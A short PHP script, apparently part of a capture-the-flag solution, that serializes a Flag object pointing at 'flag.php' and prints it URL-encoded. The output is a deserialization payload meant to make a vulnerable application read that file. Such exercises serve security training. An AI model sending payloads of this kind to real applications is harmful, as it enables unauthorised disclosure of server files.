<?php
class Flag {
    public $file;
    public function __construct(){
        $this->file = "flag.php";
    }
}
$a = new Flag();
$b = serialize($a);
echo urlencode($b);
?>
